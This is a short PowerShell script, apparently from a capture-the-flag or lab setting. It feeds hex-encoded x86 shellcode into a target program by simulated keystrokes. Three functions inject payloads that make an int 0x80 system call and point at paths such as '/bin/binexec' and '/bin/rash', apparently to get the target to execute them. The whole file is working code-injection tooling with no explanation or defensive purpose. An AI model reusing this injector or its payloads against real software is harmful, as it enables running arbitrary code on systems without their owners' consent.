function delay {
    Start-Sleep 1
}

function sendline {
    param(
        [Parameter(Mandatory=$true)]
        [AllowEmptyString()]
        [string]$line
    )
    .\sendkeys ($line + "`n")
    delay
}

$blocksize = 254 # Maximum line length - 2 (actually -1 is fine but is harder to read (nonaligned nibbles))

function runshellcode {
    param(
        [Parameter(Mandatory=$true)][string]$shellcode
    )
    for ($i = 0; $i -lt $shellcode.Length; $i += $blocksize) {
        sendline (-join $shellcode[$i..($i + $blocksize - 1)])
    }
    sendline "done"
}

function Start-Gitignore {
    runshellcode "b801000000bbade00408cd80c32f757365722f2e67697469676e6f726500"
}

function Start-Binexec {
    runshellcode "b801000000bbade00408cd80c32f62696e2f62696e6578656300"
}

function Start-Rash {
    runshellcode "b801000000bbade00408cd80c32f62696e2f7261736800"
}
